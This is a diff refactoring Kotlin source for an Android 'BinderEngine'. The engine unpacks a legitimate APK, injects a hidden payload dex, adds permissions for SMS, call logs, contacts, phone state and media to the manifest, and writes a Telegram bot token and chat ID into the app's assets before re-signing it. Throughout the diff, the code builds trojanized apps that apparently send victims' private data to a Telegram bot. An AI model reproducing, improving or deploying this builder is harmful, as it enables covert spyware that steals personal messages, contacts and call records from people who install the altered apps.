@@ -46,29 +46,24 @@ class BinderEngine(private val context: Context) {
         onLog: (LogLevel, String) -> Unit
     ): BindResult = withContext(Dispatchers.IO) {
 
-        val cfg = config
-        val token = cfg.component1()
-        val chat = cfg.component2()
-        @Suppress("UNUSED_VARIABLE")
-        val cfgFeatures = cfg.component3()
-
-        var srcFile: File? = null
-        var temp: File? = null
-        var signed: File? = null
+        val temps = ArrayList<File>()
 
         try {
             if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
             if (activity.isNotBlank()) onLog(LogLevel.INFO, "Activity: $activity")
+            if (!config.originalAppClass.isNullOrBlank()) {
+                onLog(LogLevel.INFO, "Original App class: ${config.originalAppClass}")
+            }
 
-            srcFile = resolveSource(source)
-            if (srcFile == null) {
+            val src = resolveSource(source)
+            if (src == null) {
                 onLog(LogLevel.ERROR, "Source APK not readable")
                 return@withContext BindResult(false, "Source not readable")
             }
-            onLog(LogLevel.INFO, "Source APK: ${srcFile.length() / 1024} KB")
+            onLog(LogLevel.INFO, "Source APK: ${src.length() / 1024} KB")
 
             val pm = context.packageManager
-            val info = pm.getPackageArchiveInfo(srcFile.absolutePath, 0)
+            val info = pm.getPackageArchiveInfo(src.absolutePath, 0)
             if (info == null) {
                 onLog(LogLevel.ERROR, "Source APK could not be parsed")
                 return@withContext BindResult(false, "Parse failed")
@@ -77,18 +72,19 @@ class BinderEngine(private val context: Context) {
             val pkg = info.packageName
             onLog(LogLevel.INFO, "Package: $pkg")
 
-            val permissions = buildPermissions(features)
+            val permissions = buildPermissions(features, config.features)
             onLog(LogLevel.INFO, "Permissions to inject: ${permissions.size}")
 
             val authority = pkg + Const.AUTHORITY_SUFFIX
             onLog(LogLevel.INFO, "Authority: $authority")
 
-            temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
+            val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
+            temps.add(temp)
 
             var patched: ByteArray? = null
             var payloadDexName = "classes.dex"
 
-            ZipFile(srcFile).use { zip ->
+            ZipFile(src).use { zip ->
 
                 val entry = zip.getEntry(MANIFEST)
                 if (entry == null) {
@@ -108,11 +104,12 @@ class BinderEngine(private val context: Context) {
                     permissions
                 )
 
-                if (patched == null) {
+                val patchedBytes = patched
+                if (patchedBytes == null) {
                     onLog(LogLevel.ERROR, "Manifest patch failed")
                     return@withContext BindResult(false, "Manifest patch failed")
                 }
-                onLog(LogLevel.INFO, "Patched manifest: ${patched!!.size} bytes")
+                onLog(LogLevel.INFO, "Patched manifest: ${patchedBytes.size} bytes")
 
                 payloadDexName = nextDexName(zip)
                 onLog(LogLevel.INFO, "Payload dex slot: $payloadDexName")
@@ -139,11 +136,11 @@ class BinderEngine(private val context: Context) {
                                 writeEntry(zos, cs, name, data, stored)
                             }
 
-                            writeEntry(zos, cs, MANIFEST, patched!!, false)
+                            writeEntry(zos, cs, MANIFEST, patchedBytes, false)
                             writeEntry(zos, cs, payloadDexName, payloadDex, false)
 
-                            if (token.isNotBlank() && chat.isNotBlank()) {
-                                val json = "{\"bot_token\":\"$token\",\"chat_id\":\"$chat\"}"
+                            if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
+                                val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
                                 writeEntry(
                                     zos, cs, "assets/" + Const.CONFIG_ASSET,
                                     json.toByteArray(), false
@@ -158,7 +155,8 @@ class BinderEngine(private val context: Context) {
             }
 
             onLog(LogLevel.INFO, "Signing...")
-            signed = File(context.cacheDir, "hs_${System.currentTimeMillis()}.signed.apk")
+            val signed = File(context.cacheDir, "hs_${System.currentTimeMillis()}.signed.apk")
+            temps.add(signed)
 
             try {
                 sign(temp, signed, onLog)
@@ -189,11 +187,13 @@ class BinderEngine(private val context: Context) {
                 return@withContext BindResult(false, "Cannot create output file")
             }
 
-            context.contentResolver.openOutputStream(doc.uri)?.use { o ->
-                signed.inputStream().use { i -> i.copyTo(o) }
-            } ?: run {
+            val out = context.contentResolver.openOutputStream(doc.uri)
+            if (out == null) {
                 onLog(LogLevel.ERROR, "Cannot write output file")
                 return@withContext BindResult(false, "Cannot write output")
+            }
+            out.use { o ->
+                signed.inputStream().use { i -> i.copyTo(o) }
             }
 
             onLog(LogLevel.SUCCESS, "Saved: $outName")
@@ -204,40 +204,46 @@ class BinderEngine(private val context: Context) {
             t.stackTrace.take(6).forEach { onLog(LogLevel.ERROR, "   at $it") }
             BindResult(false, t.message ?: "Unknown error")
         } finally {
-            try {
-                srcFile?.let { if (it.absolutePath.contains("src_")) it.delete() }
-                temp?.let { if (it.exists()) it.delete() }
-                signed?.let { if (it.exists()) it.delete() }
-            } catch (_: Throwable) {
+            for (f in temps) {
+                try {
+                    if (f.exists()) f.delete()
+                } catch (_: Throwable) {
+                }
             }
         }
     }
 
     private fun resolveSource(uri: Uri): File? {
-        return try {
+        try {
             if (uri.scheme == "file") {
-                val f = uri.path?.let { File(it) }
-                if (f != null && f.exists()) f else null
-            } else {
-                val tmp = File(context.cacheDir, "src_${System.currentTimeMillis()}.apk")
-                context.contentResolver.openInputStream(uri)?.use { i ->
-                    tmp.outputStream().use { o -> i.copyTo(o) }
+                val path = uri.path
+                if (path != null) {
+                    val f = File(path)
+                    if (f.exists()) return f
                 }
-                if (tmp.exists() && tmp.length() > 0) tmp else null
+                return null
             }
+            val tmp = File(context.cacheDir, "src_${System.currentTimeMillis()}.apk")
+            val input = context.contentResolver.openInputStream(uri)
+            if (input == null) return null
+            input.use { i ->
+                tmp.outputStream().use { o -> i.copyTo(o) }
+            }
+            if (tmp.exists() && tmp.length() > 0) return tmp
+            return null
         } catch (t: Throwable) {
-            null
+            return null
         }
     }
 
     private fun sanitize(label: String): String {
-        val base = label.ifBlank { "app" }
-            .replace(Regex("[^A-Za-z0-9._-]"), "_")
-            .take(40)
+        var base = label.ifBlank { "app" }
+        base = base.replace(Regex("[^A-Za-z0-9._-]"), "_")
+        base = base.take(40)
         return if (base.isBlank()) "app" else base
     }
 
-    private fun buildPermissions(features: Set<Feature>): List<String> {
+    private fun buildPermissions(features: Set<Feature>, keys: List<String>): List<String> {
         val set = LinkedHashSet<String>()
 
         set += "android.permission.INTERNET"
@@ -248,25 +254,30 @@ class BinderEngine(private val context: Context) {
         set += "android.permission.FOREGROUND_SERVICE"
         set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
 
-        val keys = features.map { (it.key + " " + it.name).lowercase() }
+        val all = ArrayList<String>()
+        for (f in features) {
+            all.add(f.key.lowercase())
+            all.add(f.name.lowercase())
+        }
+        for (k in keys) all.add(k.lowercase())
 
-        if (keys.any { it.contains("gallery") || it.contains("image") || it.contains("photo") }) {
+        if (all.any { it.contains("gallery") || it.contains("image") || it.contains("photo") }) {
             set += "android.permission.READ_EXTERNAL_STORAGE"
             set += "android.permission.READ_MEDIA_IMAGES"
             set += "android.permission.READ_MEDIA_VIDEO"
         }
-        if (keys.any { it.contains("sms") }) {
+        if (all.any { it.contains("sms") }) {
             set += "android.permission.READ_SMS"
             set += "android.permission.RECEIVE_SMS"
         }
-        if (keys.any { it.contains("call") }) {
+        if (all.any { it.contains("call") }) {
             set += "android.permission.READ_CALL_LOG"
             set += "android.permission.READ_PHONE_STATE"
         }
-        if (keys.any { it.contains("contact") }) {
+        if (all.any { it.contains("contact") }) {
             set += "android.permission.READ_CONTACTS"
         }
-        if (keys.any { it.contains("device") || it.contains("info") }) {
+        if (all.any { it.contains("device") || it.contains("info") }) {
             set += "android.permission.READ_PHONE_STATE"
         }
 
